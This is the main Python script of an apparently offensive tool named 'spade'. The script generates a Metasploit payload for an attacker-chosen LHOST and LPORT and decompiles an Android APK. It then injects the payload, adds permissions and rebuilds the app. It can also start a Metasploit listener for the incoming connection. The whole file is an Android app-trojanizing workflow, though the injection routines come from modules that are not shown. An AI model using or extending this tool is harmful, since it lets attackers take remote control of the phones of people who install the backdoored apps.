#!/usr/bin/env python

#    Copyright (C) <2016>  <M U Suraj>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

# Created by suraj (#r00t)

import os
import re
import sys
from core import console
from core import pycolor
from core import apkd
from core import msf
import time

pyc = pycolor.pyColor()

if __name__ == '__main__':
	
	try:
		console.banner()
		print (pyc.Info("Started spade at %s"%(time.strftime('%X'))))
		mainapk = console.initstuff()
		payload,LHOST,LPORT = msf.setoptions()
		msf.generate(payload, LHOST, LPORT)
		apkd.decompile(mainapk)
		apkd.inject(mainapk)
		apkd.permissions(mainapk)
		apkd.rebuild(mainapk)
		msfch = raw_input("Do you want to setup a listener?[y/n]").lower()
		if(msfch=='y'):
			msf.msfhandler(payload, LHOST,LPORT)
		console.clean(mainapk)
	except Exception, ex:
		print pyc.Err("%s"%(ex))
	


